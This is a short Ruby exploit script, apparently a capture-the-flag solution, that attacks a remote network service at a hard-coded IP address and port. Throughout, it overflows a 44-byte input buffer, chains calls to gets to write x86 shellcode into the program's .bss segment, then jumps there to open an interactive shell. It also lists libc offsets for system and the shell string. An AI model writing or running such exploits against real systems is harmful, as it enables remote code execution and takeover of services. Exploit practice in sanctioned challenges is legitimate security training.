#!/usr/bin/env ruby
#encoding:ascii
require '~/Tools/pwnlib'

local = false#true
if local
	host, port = '127.0.0.1', 4444
	libc_start_main_offset = 0x0019970
	printf_offset = 0x004cbf0
	scanf_offset = 0x00610c0
	system_offset = 0x0003e360
	sh_offset = 0x11ca8
else
	host, port = '130.211.202.98', 7575
	system_offset = 0x0003f250#0x0003fc40 #0x0003ff10 #0x0003fc40
	sh_offset = 0x0015e324 #0x0015e5e4 #0x0015e324
	libc_start_main_offset = 0x00019970
end

def p32(*addr)
	return addr.pack("L*")
end
PwnTube.open(host, port) do |r|
	@r=r
	start = 0x8048420
	pop2_ret = 0x0804864e #: pop edi ; pop ebp ; ret
	bss = 0x0804a100
	gets = 0x80483d0
	
	@r.recv_until("What's your name?")
	payload = 'a'*44 #44
	payload << p32(gets, pop2_ret , bss, 40, gets, start, bss+0x100,40)
	@r.send("#{payload}\n")
	@r.send("1\n")
	
	payload = PwnLib.shellcode_x86+"\x90"*(44-PwnLib.shellcode_x86.size)
	@r.send("#{payload}\n")
	
	payload = 'a'*44
	payload << p32(bss+0x100)
	@r.send("#{payload}\n")
	@r.interactive()
end
